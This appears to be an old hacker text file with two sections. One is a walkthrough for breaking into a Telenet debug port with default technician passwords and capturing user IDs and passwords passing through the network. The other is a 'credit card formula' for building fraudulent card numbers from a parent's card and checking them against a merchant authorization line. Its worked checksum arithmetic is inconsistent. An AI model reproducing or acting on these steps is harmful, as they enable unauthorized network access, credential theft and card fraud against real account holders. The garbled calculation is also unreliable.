OBTAINING TELENET NUI'S
~~~~~~~~~~~~~~~~~~~~~~~
An  NUI  stands for Network User Identification, and are HELL to obtain.  I
recently picked up a file which explained how to get them V E R  Y  easily,
but it was so badly written, that I decided to write it again clearer...

c 602 xxx.xx

602  is  the address for the engineer's node of Telenet.  The file said log
into 602.99, but that's not a valid number, so scan untl you get something.
I t will be absolutely BLANK.  nothing will happen.  DO NOT TOUCH ANYTHING.
Wait about 20 seconds and then enter in @ (no c/r)
 It should then say TELENET
 if nothing happens, wait 1 minute and then press return.  if you  get  the
 TELENET prompt, type:
SET 15:0
(wait 15 seconds for time delay and type in
CONT

you should see :

TP3005 DEBUG PORT V5.37.03
>

Type either
SUPERMAN or WONDERWOMAN  (male and female tech p/w respectively)

if you get another >, type
7FDS (C/R)
it should spit back
E 01

type:
L7FE,L,A2,R2,D
it will say:
      R 00A626   8805
type
40588
and you'll receive
E 01

now open up your capture log and type R0588

You  will  then  get  ALL  of  the  information  passing through the packet
switching software  (NUI'S  and  NUA'S  and  possibly  ID's  and  p/w's  on
systems!!!)

If  it  doesn't  look  right,  then  just run the ascii file through a X.25
protocol transfer and then read it.

CREDIT CARD FORMULA
~~~~~~~~~~~~~~~~~~~

Okay, everyone wants to know the  Credit  Card  formula  these  days.   So,
tokeep people from asking anymore, here is the whole story...

MASTERCARD ..... 5xxx xxxx xxxx xxxc
VISA ........... 4xxx xxx xxx xxc
VISA GOLD ...... 4xxx xxxx xxxx xxxc
AMERICAN EXPRESS 3xxxxxxxxxc

Those are the major credit card formats and their number.

Now,  go  to mommy and daddy's wallet, and copy the first 2 sets of numbers
from the card (if the # was 5289 0291 xxxx xxxx, copy the 5289 0291)
Then, make up 7 digits, or 1 less than the available spaces left.  The last
number is the check digit, which will be explained later.

Say we picked 9876 543 as our last 7 digits.  we would then write the  card
number out like this:

15  14  13  12   11  10  9  8   7  6  5  4    3  2  1  c
|    |   |   |    |   |  |  |   |  |  |  |    |  |  |
5    2   8   9    0   2  9  1   9  8  7  6    5  4  3

now,  starting  from  the right (at the #1) and going to the left, multiply
all the ODD digit places by 2.

3 x 2 = 6                       (If the product is a 2  digit  number,  add
5 x 2 = 10 --->  1+0 = 1        them together to make a 1 digit number)
7 x 2 = 14 --->  1+4 = 5
7 x 2 = 14 --->  1+4 = 5
9 x 2 = 18 --->  1+8 = 9
9 x 2 = 18 --->  1+8 = 9
0 x 2 = 0
8 x 2 = 16 --->  1+6 = 7
5 x 2 = 10 --->  1+0 = 1

Now, add these sums up with the remaining numbers:

1 + 2 + 7 + 9 + 0 + 2 + 9 + 1 + 9 + 8 + 5 + 6 + 1 + 4 + 6 = 70

now  take the next highest number that's divisible by 10 (unless the numebr
itself is divisible by 10) and subtract your answer from it.  )

In this case 70-70 = 0

The last digit is 0, therefore, your card number would be:
5289 0291 9876 5430

make up an exp. date possibly 3 or 4 months ahead of the current date, then
call to see if it has an abundance of credit.

1-800-554-2265
types: 10#  MasterCard
       20#  Visa
Bank Id: 1067#
Merchant #: 50#
Then enter card number and exp date and amount as XX*XX.  it will tell  you
if it's valid (which it is) and if t can support that much of a purchase..
